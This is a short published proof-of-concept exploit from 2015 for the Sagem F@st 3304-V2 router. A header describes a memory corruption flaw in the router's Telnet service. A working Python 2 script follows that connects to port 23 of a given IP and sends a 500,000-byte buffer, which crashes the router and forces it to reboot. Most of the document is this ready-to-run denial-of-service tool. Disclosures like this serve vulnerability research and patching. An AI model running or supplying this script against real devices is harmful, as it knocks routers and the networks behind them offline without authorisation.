# Title              : Sagem F@st 3304-V2 Telnet Crash POC
# Vendor             : http://www.sagemcom.com
# Severity           : High
# Tested Router      : Sagem F@st 3304-V2 (3304-V1, other versions may also be affected)
# Date               : 2015-03-08
# Author             : Loudiyi Mohamed
# Contact            : Loudiyi.2010@gmail.com
# Blog               : https://www.linkedin.com/pub/mohamed-loudiyi/86/81b/603
# Vulnerability description:
#==========================
#A Memory Corruption Vulnerability is detected on Sagem F@st 3304-V2 Telnet service. An attacker can crash the router by sending a very long string.
#This exploit connects to Sagem F@st 3304-V2 Telnet (Default port 23) and sends a very long string "X"*500000.
#After the exploit is sent, the telnet service will crash and the router will reboot automatically.
 
#Usage: python SagemDos.py "IP address"

# Code
#========================================================================
 #!/usr/bin/python
import socket
import sys
print("######################################")
print("#    DOS Sagem F@st3304 v1-v2        #")
print("#   	----------                  #")
print("#       BY  LOUDIYI MOHAMED          #")
print("#####################################")
if (len(sys.argv)<2):
	print "Usage: %s <host> " % sys.argv[0]
	print "Example: %s 192.168.1.1 " % sys.argv[0]
	exit(0)
print "\nSending evil	buffer..."
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
 s.connect((sys.argv[1], 23))
 buffer = "X"*500000
 s.send(buffer)
except:
 print "Could not connect to Sagem Telnet!"
#========================================================================

